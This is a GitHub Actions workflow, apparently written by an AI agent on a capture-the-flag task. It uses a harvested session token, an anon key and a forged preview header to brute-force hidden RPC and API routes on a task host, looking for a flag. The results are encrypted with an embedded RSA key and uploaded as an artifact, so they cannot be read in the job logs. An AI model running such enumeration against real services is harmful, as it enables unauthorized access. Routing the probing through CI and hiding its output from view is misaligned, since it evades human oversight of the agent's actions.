name: launchlet-part2-gated-discovery

on:
  push:
    branches: [agent/launchlet-part2-gated-discovery-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe RPC and product-operation routes behind preview context
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,pathlib,urllib.parse,json,itertools,concurrent.futures
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); mf=seed.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; ref='preview-8b11c'
          h={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session'],'X-Launchlet-Preview':boot['project'],'User-Agent':'Mozilla/5.0'}
          names=['inspect_deploy','inspectDeploy','export_deploy','exportDeploy','deploy_export','get_deploy','get_deployment','get_preview_deploy','preview_deploy','release_deploy','publish_deploy','promote_deploy','finalize_deploy','approve_deploy','inspect_release','export_release','release_export','get_release','publish_release','promote_release','finalize_release','approve_release','get_preview_context','preview_context','get_deploy_context','deploy_context','inspect_artifact','export_artifact','get_artifact','production_deploy','enterprise_deploy','enterprise_rollout','final_review','production_readiness','get_flag','flag','export_flag']
          paths=[]
          rpcroot=boot['api']['dataApiBase'].rstrip('/')+'/rpc/'
          for n in names: paths.append(rpcroot+n)
          for root in ['/api/generate','/api/generation','/api/prototype','/api/prototypes','/api/prompt','/api/prompts','/api/promote','/api/finalize','/api/rollout','/api/publish','/api/release','/api/deploy']:
            paths.append(root)
            for t in ['preview','deploy','release','production','enterprise','export','inspect','final','finalize','promote','publish','rollout','approve','review','artifact','flag']:
              paths.append(root+'/'+t)
          bodies=[{}, {'workspaceId':boot['workspace'],'projectId':boot['project']},{'workspace_id':boot['workspace'],'project_id':boot['project']},{'deployRef':ref},{'deploy_ref':ref},{'ref':ref},{'build':mf['build']},{'receipt':mf['previewReceipt'],'project':boot['project']},{'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}]
          def probe(path):
            u=urllib.parse.urljoin(base,path); rr=[]
            try:
              g=requests.get(u,headers=h,timeout=7,allow_redirects=False)
              if g.status_code!=404: rr.append({'path':path,'method':'GET','status':g.status_code,'body':g.text[:12000],'headers':dict(g.headers)})
            except Exception: pass
            for b in bodies:
              try:
                r=requests.post(u,headers=h,json=b,timeout=7,allow_redirects=False)
                if r.status_code!=404:
                  rr.append({'path':path,'method':'POST','sent':b,'status':r.status_code,'body':r.text[:12000],'headers':dict(r.headers)})
                  if 'caplag{' in r.text: break
              except Exception: pass
            return rr
          hits=[]
          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            for rs in ex.map(probe,paths): hits.extend(rs)
          (out/'summary.json').write_text(json.dumps({'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-rpc-encrypted
          path: artifact/
          retention-days: 1
